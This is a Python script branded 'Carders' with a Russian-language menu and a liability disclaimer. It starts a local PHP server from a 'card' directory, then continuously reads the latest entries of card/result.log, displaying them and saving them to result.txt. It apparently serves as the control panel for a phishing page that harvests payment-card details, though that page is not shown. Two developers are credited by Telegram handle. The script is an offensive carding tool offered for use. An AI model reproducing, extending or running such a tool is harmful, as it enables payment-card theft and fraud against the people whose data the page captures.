from time import sleep
from termcolor import colored
import subprocess
import os
import time


with open('card/result.log','w'):
    pass



class Card:
    banner = colored("""
 ▄████▄   ▄▄▄       ██▀███  ▓█████▄ ▓█████  ██▀███    ██████
▒██▀ ▀█  ▒████▄    ▓██ ▒ ██▒▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒▒██    ▒
▒▓█    ▄ ▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌▒███   ▓██ ░▄█ ▒░ ▓██▄
▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒
▒ ▓███▀ ░ ▓█   ▓██▒░██▓ ▒██▒░▒████▓ ░▒████▒░██▓ ▒██▒▒██████▒▒
░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░
  ░  ▒     ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░
░          ░   ▒     ░░   ░  ░ ░  ░    ░     ░░   ░ ░  ░  ░
░ ░            ░  ░   ░        ░       ░  ░   ░           ░
░                            ░
""", "red")
    menu = """
- 1. Карточки
- 2. Разработчики
- 3. Выход
"""

    def check(self):
        dis = input("""
                 \033[37m\033[31mВНИМАНИЕ!
      ПОЛНЫЙ ОТКАЗ ОТ ОТВЕТСТВЕНОСТИ!
СКРИПТ ПРЕДОСТАВЛЕН В ОЗНАКОМИТЕЛЬНЫХ ЦЕЛЯХ!
     ВСЕ ДЕЙСТВИЯ НА ВАШ СТРАХ И РИСК!\033[0m

Вы готовы условия соглашения? (y/N): """)

        if not dis in ['','Y','y']:
            exit()
            
       

    def start(self):

        check_out = None
        subprocess.Popen('cd card && php -S localhost:8080' , shell = True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        time.sleep(2)
        
        while True:
            time.sleep(1)
            os.system('clear')
            try:
                with open('card/result.log') as text:
                    out = text.readlines()
                    out = out[-4:]
            except:
                pass

            if check_out:
                check = zip(check_out,out)
                for x,y in check:
                    if x != y:
                        break
                else:
                    for x in check_out:
                        print(x,end='')
                    continue
                
                     
            if out:
                check_out = out
                with open('result.txt','w') as to_out:
                    for x in out:
                        to_out.write(x)
                        print(x,end='')
            else:
                print('Данных нет!')


            


    def author(self):
        print("""
Разработчики: @batyarimskiy, @awequr
Связь через Telegram (TG)
Для выхода в меню нажмите Enter: """)
        input()
    
    def run(self):
        os.system('clear')

        print(self.banner)
        print(self.menu)

        vod = None

        while not vod:
            vod = int(out) if (out:=input('carders> ')).isdigit() else print('Неверные данные')

        if vod == 1:
            self.start()
        elif vod == 2:
            self.author()
        else:
            exit()

card = Card()

card.check()

while True:
    card.run()
